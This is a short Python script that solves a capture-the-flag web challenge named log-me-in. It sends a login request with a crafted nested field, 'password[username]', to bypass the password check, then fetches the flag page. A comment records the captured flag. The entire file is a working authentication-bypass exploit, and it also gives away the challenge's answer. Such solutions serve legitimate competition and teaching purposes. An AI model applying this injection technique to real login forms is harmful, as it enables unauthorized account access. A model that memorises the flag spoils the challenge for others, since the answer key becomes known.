import requests
from urllib3.exceptions import InsecureRequestWarning


url = "https://log-me-in.web.ctfcompetition.com/"
s = requests.Session()
s.verify = False
r = s.post(url=url + "login", data={
    "username": "michelle",
    "password[username]": "password"
})
r1 = s.get(url=url + "flag")
print(r1.text)
s.close()

#       <div class="container">
#         <h1>Flags are great!</h1>
#         <p>Flag: CTF{a-premium-effort-deserves-a-premium-flag}</p>
#         </div>
#     </body>
# </html>
